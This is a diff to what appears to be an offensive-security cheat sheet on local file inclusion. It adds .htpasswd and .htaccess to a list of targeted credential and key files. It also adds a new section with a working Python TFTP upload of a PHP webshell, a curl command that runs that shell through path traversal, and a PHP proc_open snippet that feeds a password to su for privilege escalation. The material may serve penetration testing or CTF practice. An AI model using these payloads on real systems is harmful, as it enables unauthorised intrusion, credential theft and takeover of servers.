@@ -84,6 +84,8 @@ GET /admin/files/get?file=../../../../../../etc/passwd
 /root/.ssh/id_rsa
 /home/user/.ssh/id_rsa
 /var/www/.git/config
+/var/www/html/.htpasswd
+/var/www/html/.htaccess
 ```
 
 ### Windows Target Files
@@ -221,6 +223,35 @@ curl -s "http://target/page.php?file=....%5C/....%5C/....%5C/....%5C/var/log/apa
 /var/log/mail.log                 # Mail log (SMTP injection)
 /var/log/vsftpd.log               # FTP log
 /var/log/sshd.log                 # SSH log
+```
+
+### LFI + TFTP = RCE (No Log Poisoning Needed)
+
+When TFTP (UDP 69) allows anonymous uploads, upload a PHP webshell to `/var/lib/tftpboot/` and include it via LFI:
+
+```bash
+# Upload webshell via TFTP (Python — works cross-platform)
+python3 -c "
+import socket, struct
+data = b'<?php echo shell_exec(\$_GET[\"cmd\"]); ?>'
+pkt = struct.pack('!H', 2) + b'shell.php\x00' + b'octet\x00'
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
+s.sendto(pkt, ('TARGET', 69)); resp, addr = s.recvfrom(516)
+s.sendto(struct.pack('!HH', 3, 1) + data, ('TARGET', addr[1]))
+s.recvfrom(516); print('Done')
+"
+# Include via LFI
+curl "http://TARGET/?file=../../../var/lib/tftpboot/shell.php&cmd=id"
+```
+
+**PTY for `su` via webshell:** `su` requires a terminal. Use PHP `proc_open()` with PTY descriptors:
+```php
+<?php
+$proc = proc_open('su - USER -c "CMD"', [['pty'],['pty'],['pty']], $pipes);
+usleep(500000); fwrite($pipes[0], "PASSWORD\n"); fflush($pipes[0]);
+usleep(1000000); echo stream_get_contents($pipes[1]);
+fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
+?>
 ```
 
 ### Alternative LFI Techniques (when log poisoning fails)
